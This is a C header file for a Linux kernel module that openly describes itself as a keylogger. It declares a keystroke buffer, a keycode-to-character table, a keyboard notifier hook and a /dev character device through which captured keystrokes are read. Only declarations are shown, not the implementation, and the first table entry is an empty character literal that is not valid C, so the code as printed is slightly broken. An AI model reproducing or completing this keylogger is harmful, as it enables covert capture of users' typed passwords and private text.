/**
 * Linux keylogger kernel module
 * Copyright (C) 2014 Ng Tzy Luen. All Rights Reserved.
 *
 * Tested under GNU C gcc 4.7.2, linux kernel v3.14.0
 */
#ifndef APATE_H
#define APATE_H

#define DEV_NAME        "apate" /* device name to appears in /dev */
#define DEV_MAJOR       78      /* device's major */
#define DEV_MINOR       0       /* device's minor */
#define BUFF_LENGTH     1024    /* buffer length for kernel space: static char buffer[BUFF_LENGTH + 1] */

/* global variables */
static char buffer[BUFF_LENGTH + 1];    /* storage for keystrokes */
static char *bptr = buffer;             /* pointer to buffer; for basic pointer arithmetic purposes */
static const char *endptr = (buffer + sizeof(buffer) - 1);  /* the ending address of buffer's tail */
static short read_pos = 0;  /* keep track of read position, as in dev_read() */
static int dev_major;       /* device major variable in case DEV_MAJOR constant not set */
static struct class *apate_class;   /* the apate class pointer; required by device_create() */
static struct cdev apate_cdev;      /* cdev is character device type used by kernel internally */
static dev_t dev;           /* dev number we use throughout apate module */

/* reference:
 * from kernel source: include/uapi/linux/input.h
 * KEY_ESC:1 ... KEY_SLASH:53 
 *
 * use `showkey` util to get the corresponding keycodes for QWERTY keyboard layout
 */
static const char char_table[] = {
    '', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r',
    '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
    'Z', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'Z',
    'Z', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
};


static inline char get_ascii(int);
/*static int dev_open(struct inode *, struct file *);*/
/*static int dev_release(struct inode *, struct file *);*/
static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
static int kbd_notifier(struct notifier_block *, unsigned long, void *);

static struct file_operations fops = {
    /*.open = dev_open,*/
    /*.release = dev_release,*/
    .read = dev_read,   /* .read takes in a pointer to a function once read */
};

static struct notifier_block nb = {
    .notifier_call = kbd_notifier   /* .notifier_call takes in a pointer to a function */
};

#endif
